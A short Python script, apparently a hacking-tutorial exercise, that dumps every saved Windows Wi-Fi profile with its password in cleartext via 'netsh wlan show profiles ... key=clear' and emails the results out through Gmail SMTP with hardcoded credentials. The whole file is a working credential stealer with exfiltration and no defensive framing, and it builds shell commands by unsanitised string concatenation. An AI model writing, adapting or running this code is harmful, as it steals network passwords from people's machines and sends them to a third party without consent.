#!/usr/bin/env python
import subprocess ,smtplib,re

def send_mail(email,password,message):
    server=smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()


email="testmail@gmail.com"
password="password"
command="netsh wlan show profile"
networks = subprocess.getoutput(command)
networks_names_list = re.findall("(?:Profile\s*:)(.*)",networks)
result=""

for networks in networks_names_list:
   command="netsh wlan show profiles "+networks+" key=clear"
   current_result=subprocess.getoutput(command)
   result=result+current_result
send_mail(email,password,result)

